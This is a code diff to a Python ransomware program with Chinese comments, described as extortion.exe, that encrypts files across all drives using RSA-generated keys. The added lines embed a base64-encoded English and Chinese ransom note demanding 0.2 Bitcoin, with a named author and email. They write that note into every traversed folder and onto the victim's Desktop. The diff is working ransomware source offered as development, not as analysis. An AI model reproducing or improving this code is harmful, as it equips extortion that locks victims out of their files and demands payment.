@@ -14,6 +14,7 @@ from Crypto.Random import get_random_bytes
  执行extortion.exe开始加密                                                     
  解密时将private.pem文件上传到病毒路径下，执行extortion.exe de解密               
 """
+
 lock = threading.Lock()
 threads = []
 skip_dic=[
@@ -51,6 +52,20 @@ def CreateRSAKeys():
     with open("private.pem", "wb") as f:
         f.write(privkey.save_pkcs1())
 
+#生成信息
+def get_msg():
+    author = '薛定的饿猫'
+    email = 'luk.mail.cn@gmail.com'
+    msg ="77u/RU5HTElTSDoKI1doYXQgaGFwcGVuZWQ/CkFMTCB5b3VyIGltcG9ydGFudCBmaWxlcyhkYXRhYmFzZSxkb2N1bWVudHMsaW1hZ2VzLHZpZGVvcyxtdXNpYyxldGMuKWhhdmUgYmVlbiBlbmNyeXB0ZWQhCkFuZCBvbmx5IHdlIGNhbiBkZWNyeXB0IQpUbyBkZWNyeXB0IHlvdXIgZmlsZXMseW91IG5lZWQgdG8gYnV5IHRoZSBkZWNyeXB0aW9uIGtleSBmcm9tIHVzLgpXZSBhcmUgdGhlIG9ubHkgb25lIHdobyBjYW4gZGVjcnlwdCB0aGUgZmlsZSBmb3IgeW91LgoKI0F0dGVudGlvbiEKVHJ5aW5nIHRvIHJlaW5zdGFsbCB0aGUgc3lzdGVtIGFuZCBkZWNyeXB0aW5nIHRoZSBmaWxlIHdpdGggYSB0aGlyZC1wYXJ0eSB0b29sIHdpbGwgcmVzdWx0CmluIGZpbGUgY29ycnVwdGlvbix3aGljaCBtZWFucyBubyBvbmUgY2FuIGRlY3J5cHQgeW91ciBmaWxlLihpbmNsdWRpbmcgdXMpLAppZiB5b3Ugc3RpbGwgdHJ5IHRvIGRlY3J5cHQgdGhlIGZpbGUgeW91cnNlbGYseW91IGRvIHNvIGF0IHlvdXIgb3duIHJpc2shCgojVGVzdCBkZWNyeXB0aW9uIQpBcyBhIHByb29mLHlvdSBjYW4gZW1haWwgdXMgMyBmaWxlcyB0byBkZWNyeXB0LAphbmQgd2Ugc3RpbGwgc2VuZCB5b3UgdGhlIHJlY292ZXJlZCBmaWxlcyB0byBwcm92ZSB0aGF0IHdlIGNhbiBkZWNyeXB0IHlvdXIgZmlsZXMuCgojSG93IHRvIGRlY3J5cHQ/CjEuQnV5ICgwLjIpIEJpdGNvaW4uCjIuU2VuZCAoMC4yKSBCaXRjb2luIHRvIHRoZSBwYXltZW50IGFkZHJlc3MuCjMuRW1haWwgeW91ciBJRCB0byB1cyxhZnRlciB2ZXJpZmljYXRpb24sd2Ugd2lsbCBjcmVhdGUgYSBkZWNyeXB0aW9uIHRvb2wgZm9yIHlvdS4KClJlbWVtYmVyLGJhZCB0aGluZ3MgaGF2ZSBoYXBwZW5lZCxub3cgbG9vayBhdCB5b3VyIGRldGVybWluYXRpb24gYW5kIGFjdGlvbiEKCkF1dGhvcjojYXV0aG9yCkUtbWFpbDpsdWsubWFpbC5jbkBnbWFpbC5jb20KUGF5bWVudDromZrmi5/luIHpkrHljIXlnLDlnYAKCgoK5Lit5paH77yaCiPlj5HnlJ/kuobku4DkuYg/CuaCqOaJgOacieeahOmHjeimgeaWh+S7tu+8iOaVsOaNruW6k+OAgeaWh+aho+OAgeWbvuWDj+OAgeinhumikeOAgemfs+S5kOetie+8ieW3suiiq+WKoOWvhu+8geW5tuS4lOWPquacieaIkeS7rOaJjeiDveino+Wvhu+8gQoKI+azqOaEj+S6i+mhue+8gQrlsJ3or5Xph43mlrDlronoo4Xns7vnu5/lubbkvb/nlKjnrKzkuInmlrnlt6Xlhbfop6Plr4bmlofku7blsIblr7zoh7Tmlofku7bmjZ/lnY/vvIzov5nmhI/lkbPnnYDmsqHmnInkurrlj6/ku6Xop6Plr4bmgqjnmoTmlofku7YK77yI5YyF5ous5oiR5Lus77yJ77yM5aaC5p6c5oKo5LuN5bCd6K+V6Ieq6KGM6Kej5a+G5paH5Lu277yM5YiZ6ZyA6Ieq6KGM5om/5ouF6aOO6Zmp77yBCgoj5rWL6K+V6Kej5a+G77yBCuS9nOS4uuivgeaYju+8jOaCqOWPr+S7pemAmui/h+eUteWtkOmCruS7tuWQkeaIkeS7rOWPkemAgTPkuKropoHop6Plr4bnmoTmlofku7bvvIzmiJHku6zkvJrlsIbmgaLlpI3lkI7nmoTmlofku7blj5HpgIHnu5nmgqjvvIwK5Lul6K+B5piO5oiR5Lus5Y+v5Lul6Kej5a+G5oKo55qE5paH5Lu244CCCgoj5aaC5L2V6Kej5a+GCjEu6LSt5LmwICgwLjIpIOS4quavlOeJueW4gQoyLuWwhiAoMC4yKSDkuKog5q+U54m55biB5Y+R6YCB5Yiw5LuY5qy+5Zyw5Z2ACjMu5bCG5oKo55qESUTpgJrov4fnlLXlrZDpgq7ku7blj5HpgIHnu5nmiJHku6zvvIznu4/moLjlrp7lkI7vvIzmiJHku6zlsIbkuLrmgqjliLbkvZzop6Plr4blt6XlhbcKCuivt+iusOS9j++8jOacgOWdj+eahOS6i+aDheW3sue7j+WPkeeUn+S6hu+8jOeOsOWcqOWwseeci+aCqOeahOWGs+W/g+WSjOihjOWKqOS6hu+8gQoK5L2c6ICFOiNhdXRob3IK6YKu566x5Zyw5Z2A77yabHVrLm1haWwuY25AZ21haWwuY29tCuS7mOasvuWcsOWdgO+8muiZmuaLn+W4gemSseWMheWcsOWdgAo="
+    msg = b64decode(msg)
+    address="虚拟币钱包地址"
+    msg = msg.decode('utf-8')
+    msg = msg.replace("#author",author)
+    msg = msg.replace("#email",email)
+    msg = msg.replace('#address',address)
+    msg = msg.encode('utf-8')
+    return msg
+
 # 获取磁盘
 def get_drives():
     drives = []
@@ -68,9 +83,11 @@ def Encrypt(filename):
     lockname = filename + ".locked"
     if os.path.isfile(lockname):
         return 0
+    if "HELLO_lOOK_AT_ME.txt" in filename:
+        return 0
     try:
         data = ''
-            # 二进制只读打开文件，读取文件数据
+        # 二进制只读打开文件，读取文件数据
         with open(filename, 'rb') as f:
             data = f.read()
         out_file = open(filename, 'wb')
@@ -126,7 +143,7 @@ def Descrypt(filename):
         print(filename)
 
 
-def discoverFiles_encry(startpath):
+def discoverFiles_encry(startpath,msg):
     # 遍历加密文件
 
     # 加密的文件后缀
@@ -164,10 +181,20 @@ def discoverFiles_encry(startpath):
         ".torrent" , ".rbk" ,".rep" , ".dbb",".mdf",".MDF",".wdb"
         ]
     #print(ENCRYPTABLE_FILETYPES)
+    
     for dirpath, dirs, files in os.walk(startpath, topdown=True):
         #print(startpath)
         #print(dirpath)
         #print(files)
+        try:
+            file_path = os.path.dirname(dirpath)
+            #print(file_path)
+            infof = os.path.join(file_path, "HELLO_lOOK_AT_ME.txt")
+            #print(infof)
+            with open(infof, "wb") as f:
+                f.write(msg)
+        except:
+            pass
         for dic in skip_dic:
             if dic in dirpath:
                 dic = None
@@ -197,8 +224,8 @@ def discoverFiles_decry(startpath):
         for file in files:
             root_file = os.path.join(root, file)
             #print(os.path.join(root, file))
-            #if "HOW_TO_BACK_FILES.txt" == file:
-            #    os.remove(root_file)
+            if "HELLO_lOOK_AT_ME.txt" == file:
+                os.remove(root_file)
             #print(file+" : "+str(file.endswith(str(ext))))
             if file.endswith(str(ext)):
                 t=threading.Thread(target=Descrypt,args=(root_file,))
@@ -212,25 +239,29 @@ def discoverFiles_decry(startpath):
 
 
 def main():
+    msg=get_msg()
     #os_system = check_os() # 操作系统检测
     if len(sys.argv) == 1:
         drives=get_drives()
+        desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
+        back_file = desk + "HELLO_lOOK_AT_ME.txt"
+        if not os.path.exists(back_file):
+            with open(back_file, "wb") as f:
+                f.write(msg)
         for drive in drives:
-            t = threading.Thread(target=discoverFiles_encry, args=(drive,)).start()
+            t = threading.Thread(target=discoverFiles_encry, args=(drive,msg)).start()
         #startpath="C:\\Windows\\Temp\\test"
-        #discoverFiles_encry(startpath)
+        #discoverFiles_encry(startpath,msg)
     if len(sys.argv) == 2:
         # 解密
-        if sys.argv[1]=='en':
-            drives=get_drives()
-            for drive in drives:
-                t = threading.Thread(target=discoverFiles_encry, args=(drive,)).start()
-            #startpath="C:\\Windows\\Temp\\test"
-            #discoverFiles_encry(startpath)
-        elif sys.argv[1]=='de':
+        if sys.argv[1]=='de':
             drives=get_drives()
             for drive in drives:
                 t = threading.Thread(target=discoverFiles_decry, args=(drive,)).start()
+            desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
+            back_file = desk + "HELLO_lOOK_AT_ME.txt"
+            if os.path.exists(back_file):
+                os.remove(back_file)
             #startpath="C:\\Windows\\Temp\\test"
             #discoverFiles_decry(startpath)
         elif sys.argv[1]=='get':
